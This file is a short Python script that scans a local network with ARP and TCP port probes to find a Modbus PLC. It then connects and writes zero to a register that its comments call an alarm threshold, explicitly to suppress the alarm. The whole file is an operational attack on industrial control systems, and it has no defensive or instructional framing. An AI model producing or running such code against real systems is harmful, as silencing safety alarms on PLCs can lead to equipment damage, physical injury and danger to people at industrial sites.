import scapy.all as scapy
import socket
import time
from pymodbus.client import ModbusTcpClient

# Function to scan the network and find potential PLC IPs
def find_plc_ip():
    network_range = "192.168.1.1/24"  # Modify this based on the network configuration
    print("[*] Scanning the network for Modbus TCP devices...")

    arp_request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc  # Extract IP from the ARP response
        print(f"[+] Checking {ip} for Modbus TCP...")
        
        # Try connecting on default Modbus TCP port (502)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Timeout to avoid long waits
        result = sock.connect_ex((ip, 502))
        sock.close()
        
        if result == 0:  # Port 502 open, likely a PLC
            print(f"[+] Found PLC running Modbus TCP at {ip}")
            return ip

    print("[-] No Modbus-enabled PLC found.")
    return None

# Function to modify alarm settings via Modbus
def modify_alarm_settings(plc_ip):
    if not plc_ip:
        print("[!] No PLC found, exiting.")
        return

    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"[-] Failed to connect to PLC at {plc_ip}.")
        return
    print(f"[+] Connected to PLC at {plc_ip}")

    # Assuming Modbus register 1000 stores an alarm threshold
    ALARM_SETTING_REGISTER = 1000
    MODIFIED_ALARM_VALUE = 0  # Suppress alarm by setting to 0

    # Write new value to the alarm register
    print(f"[+] Modifying alarm settings at register {ALARM_SETTING_REGISTER}...")
    result = client.write_register(ALARM_SETTING_REGISTER, MODIFIED_ALARM_VALUE)
    if result.isError():
        print("[-] Failed to modify alarm settings.")
    else:
        print("[+] Alarm settings modified successfully!")

    client.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()  # Step 1: Discover PLC IP
    modify_alarm_settings(plc_ip)  # Step 2: Modify alarm settings